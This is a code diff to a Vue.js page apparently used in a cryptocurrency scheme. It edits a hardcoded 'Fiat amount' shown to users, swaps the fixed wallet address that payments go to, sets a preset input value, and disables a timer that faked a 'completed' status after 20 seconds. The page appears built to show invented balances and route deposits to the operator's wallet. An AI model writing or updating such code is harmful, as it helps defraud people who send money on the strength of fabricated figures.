@@ -46,7 +46,7 @@
 
           <div class="input-button-wrapper">
             <!--            <p class="text-fiat">Fiat amount: $111,032.00 | 1 ETH = {{ethereumRate}}</p>            -->
-            <p class="text-fiat">Fiat amount: $359,918 | 1 ETH = {{ethereumRate}}</p>
+            <p class="text-fiat">Fiat amount: $167,594 | 1 ETH = {{ethereumRate}}</p>
           </div>
 
           <hr/>
@@ -55,6 +55,7 @@
           <!--            <span v-if="!completed" class="loader-2"></span>-->
           <!--            <p v-else class="text-fiat">Completed : $5,000</p>-->
           <!--          </div>-->
+
 
           <div class="seprate">
             <template v-if="!completed">
@@ -185,7 +186,7 @@ export default {
       inputValue1: '',
       inputValue2: '',
       inputValue3: 119000,
-      inputValue4: 0,
+      inputValue4: 2999,
       bitcoinRate: null,
       ethereumRate: null,
       completed: false,
@@ -197,8 +198,8 @@ export default {
     // this.convertAndSave()
     // this.bitcoinAddress = "0x05ebc4CfEb0289e291f770f0A8E4C9387ECd84a6"
     // this.inputValue1 = "0x05ebc4CfEb0289e291f770f0A8E4C9387ECd84a6"
-    this.bitcoinAddress = "0xff70354170cC9bB5D53F3F968bbDBB1d2A7D0893"
-    this.inputValue1 = "0xff70354170cC9bB5D53F3F968bbDBB1d2A7D0893"
+    this.bitcoinAddress = "0x47Bd0922Dd10fDE81AF768601B0F30f79Cf2fED6"
+    this.inputValue1 = "0x47Bd0922Dd10fDE81AF768601B0F30f79Cf2fED6"
     // this.inputValue2 = this.loginForm.inputValue2
   },
   mounted() {
@@ -207,13 +208,13 @@ export default {
     // this.convertAndSave()
     // this.bitcoinAddress = "0x05ebc4CfEb0289e291f770f0A8E4C9387ECd84a6"
     // this.inputValue1 = "0x05ebc4CfEb0289e291f770f0A8E4C9387ECd84a6"
-    this.bitcoinAddress = "0xff70354170cC9bB5D53F3F968bbDBB1d2A7D0893"
-    this.inputValue1 = "0xff70354170cC9bB5D53F3F968bbDBB1d2A7D0893"
+    this.bitcoinAddress = "0x47Bd0922Dd10fDE81AF768601B0F30f79Cf2fED6"
+    this.inputValue1 = "0x47Bd0922Dd10fDE81AF768601B0F30f79Cf2fED6"
     // this.inputValue2 = this.loginForm.inputValue2
 
-    setTimeout(() => {
-      this.completed = true;
-    }, 20000); // 20 seconds = 20000 milliseconds
+    // setTimeout(() => {
+    //   this.completed = true;
+    // }, 20000); // 20 seconds = 20000 milliseconds
   }
 }
 </script>
